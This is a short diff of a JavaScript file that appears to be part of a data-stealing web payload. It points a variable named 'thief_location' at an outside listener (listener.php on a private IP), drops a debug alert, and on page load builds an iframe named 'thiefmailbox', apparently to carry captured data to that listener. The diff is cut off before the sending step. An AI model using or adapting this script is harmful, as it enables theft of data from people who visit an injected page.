@@ -1,7 +1,6 @@
 var thief_location = "http://192.168.0.17/get/"; //location of listener.php
 
 document.addEventListener("DOMContentLoaded", function() {
-	alert("load");
 	var ifrm = document.createElement("iframe");
 	ifrm.setAttribute("id", "thiefmailbox");
 	ifrm.setAttribute("name", "thiefmailbox");
